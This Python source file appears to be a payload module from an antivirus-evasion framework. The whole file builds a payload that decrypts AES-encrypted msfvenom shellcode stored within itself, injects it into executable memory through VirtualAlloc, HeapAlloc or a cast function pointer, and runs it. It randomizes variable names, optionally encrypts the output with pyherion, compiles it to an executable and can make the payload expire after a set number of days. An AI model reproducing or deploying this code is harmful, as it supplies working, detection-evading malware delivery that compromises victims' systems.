"""

This payload has AES encrypted shellcode stored within itself.  At runtime, the executable
uses the key within the file to decrypt the shellcode, injects it into memory, and executes it.


Based off of CodeKoala which can be seen here:
http://www.codekoala.com/blog/2009/aes-encryption-python-using-pycrypto/
Looks like Dave Kennedy also used this code in SET
https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/setcore.py.


module by @christruncer

"""


from datetime import date
from datetime import timedelta

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:

    def __init__(self):
        # required options
        self.description = "AES Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed"
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"

        self.shellcode = shellcode.Shellcode()

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
                                    "INJECT_METHOD"  : ["Virtual", "Virtual, Void, Heap"],
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days (\"X\" disables feature)"]
                                }


    def generate(self):
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                randctypes = helpers.randomString()

                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)

                # Create Payload code
                PayloadCode = 'import ctypes as ' + randctypes + '\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += RandPadding + ' = \'{\'\n'
                PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += RandPtr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len(' + RandShellCode + ')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x40))\n'
                PayloadCode += RandBuf + ' = (' + randctypes + '.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n'
                PayloadCode += randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + RandPtr + '),' + RandBuf + ',' + randctypes + '.c_int(len(' + RandShellCode + ')))\n'
                PayloadCode += RandHt + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
                PayloadCode += randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + RandHt + '),' + randctypes + '.c_int(-1))\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                randctypes = helpers.randomString()

                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)

                # Create Payload code
                PayloadCode = 'import ctypes as ' + randctypes + '\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandPadding + ' = \'{\'\n'
                PayloadCode += '\t' + RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += '\t' + RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += '\t' + RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += '\t' + RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += '\t' + RandPtr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len(' + RandShellCode + ')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x40))\n'
                PayloadCode += '\t' + RandBuf + ' = (' + randctypes + '.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n'
                PayloadCode += '\t' + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + RandPtr + '),' + RandBuf + ',' + randctypes + '.c_int(len(' + RandShellCode + ')))\n'
                PayloadCode += '\t' + RandHt + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
                PayloadCode += '\t' + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + RandHt + '),' + randctypes + '.c_int(-1))\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

        if self.required_options["INJECT_METHOD"][0].lower() == "heap":
            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":


                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                HeapVar = helpers.randomString()
                randctypes = helpers.randomString()

                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)

                # Create Payload code
                PayloadCode = 'import ctypes as ' + randctypes + '\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += RandPadding + ' = \'{\'\n'
                PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += ShellcodeVariableName + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += HeapVar + ' = ' + randctypes + '.windll.kernel32.HeapCreate(' + randctypes + '.c_int(0x00040000),' + randctypes + '.c_int(len(' + ShellcodeVariableName + ') * 2),' + randctypes + '.c_int(0))\n'
                PayloadCode += RandPtr + ' = ' + randctypes + '.windll.kernel32.HeapAlloc(' + randctypes + '.c_int(' + HeapVar + '),' + randctypes + '.c_int(0x00000008),' + randctypes + '.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandBuf + ' = (' + randctypes + '.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + RandPtr + '),' + RandBuf + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandHt + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
                PayloadCode += randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + RandHt + '),' + randctypes + '.c_int(-1))\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:
                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                HeapVar = helpers.randomString()
                randctypes = helpers.randomString()

                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)

                # Create Payload code
                PayloadCode = 'import ctypes as ' + randctypes + '\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandPadding + ' = \'{\'\n'
                PayloadCode += '\t' + RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += '\t' + RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += '\t' + RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += '\t' + ShellcodeVariableName + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += '\t' + HeapVar + ' = ' + randctypes + '.windll.kernel32.HeapCreate(' + randctypes + '.c_int(0x00040000),' + randctypes + '.c_int(len(' + ShellcodeVariableName + ') * 2),' + randctypes + '.c_int(0))\n'
                PayloadCode += '\t' + RandPtr + ' = ' + randctypes + '.windll.kernel32.HeapAlloc(' + randctypes + '.c_int(' + HeapVar + '),' + randctypes + '.c_int(0x00000008),' + randctypes + '.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandBuf + ' = (' + randctypes + '.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += '\t' + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + RandPtr + '),' + RandBuf + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandHt + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
                PayloadCode += '\t' + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + RandHt + '),' + randctypes + '.c_int(-1))\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

        else:
            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()

                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)

                # Create Payload code
                PayloadCode = 'from ctypes import *\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += RandPadding + ' = \'{\'\n'
                PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += ShellcodeVariableName + ' = ' + RandDecodedShellcode + '.decode("string_escape")\n'
                PayloadCode += RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += RandShellcode + '()'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:
                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()

                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)

                # Create Payload code
                PayloadCode = 'from ctypes import *\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandPadding + ' = \'{\'\n'
                PayloadCode += '\t' + RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += '\t' + RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += '\t' + RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += '\t' + ShellcodeVariableName + ' = ' + RandDecodedShellcode + '.decode("string_escape")\n'
                PayloadCode += '\t' + RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                PayloadCode += '\t' + RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += '\t' + RandShellcode + '()'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode
